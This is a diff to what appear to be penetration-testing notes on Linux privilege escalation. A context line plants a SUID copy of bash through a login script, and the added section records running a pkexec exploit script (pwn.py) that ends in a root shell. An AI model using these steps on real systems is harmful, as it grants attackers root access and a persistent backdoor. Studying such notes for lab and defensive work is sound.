@@ -1327,3 +1327,20 @@ echo "cp /bin/bash /home/sysadmin/bash && chmod u+s /home/sysadmin/bash" >> 00-h
 ```
 
 * now log out and re-ssh in to kick it off and then execute bash with `bash -p`
+
+### Pkexec as SUID
+
+```
+-rwsr-xr-x 1 root root 22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
+python3 pwn.py 
+Do you want to choose a custom payload? y/n (n use default payload)  n
+[+] Cleaning pervious exploiting attempt (if exist)
+[+] Creating shared library for exploit code.
+[+] Finding a libc library to call execve
+[+] Found a library at <CDLL 'libc.so.6', handle 7f83d3d88000 at 0x7f83d3c166a0>
+[+] Call execve() with chosen payload
+[+] Enjoy your root shell
+# id
+uid=0(root) gid=1001(julian) groups=1001(julian)
+# 
+```
